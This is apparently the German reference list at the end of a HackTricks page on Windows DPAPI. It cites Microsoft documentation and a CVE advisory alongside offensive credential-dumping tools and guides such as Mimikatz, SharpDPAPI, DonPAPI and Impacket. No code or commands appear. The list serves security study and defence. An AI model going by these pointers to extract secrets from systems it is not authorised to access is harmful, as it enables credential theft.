- [2] [DPAPI Secrets. Sicherheitsanalyse und Datenwiederherstellung in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [DPAPI-verschlüsselte Geheimnisse mit Mimikatz und C++ lesen](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 – Windows DPAPI (Data Protection Application Programming Interface) Spoofing-Sicherheitslücke](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Die Sicherheit von Chrome-Cookies unter Windows verbessern](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Einfache Extraktion der optionalen DPAPI-Entropie](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Hashcat v6.2.6 – Versionshinweise](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub-Repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI-Projektseite](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD-ACL-Missbrauch, KeePassXC-Argon2-Cracking und DPAPI-Entschlüsselung bis zum DC-Admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Verwendung und Optionen](https://github.com/GhostPack/SharpDPAPI)
- [13] [CyberStrikeAI in freier Wildbahn: Der Einsatz von KI bei realen Angriffen auf Unternehmen](https://securelist.com/tr/cyberstrikeai-attacks/121715)
- [14] [Microsoft Learn – Verschlüsselte Daten des Berichtsservers speichern](https://learn.microsoft.com/en-us/sql/reporting-services/install-windows/ssrs-encryption-keys-store-encrypted-report-server-data?view=sql-server-ver16)
- [15] [Microsoft Learn – Konfigurationsdatei RSReportServer.config](https://learn.microsoft.com/en-us/sql/reporting-services/report-server/rsreportserver-config-configuration-file?view=sql-server-ver17)
{{#include ../../banners/hacktricks-training.md}}
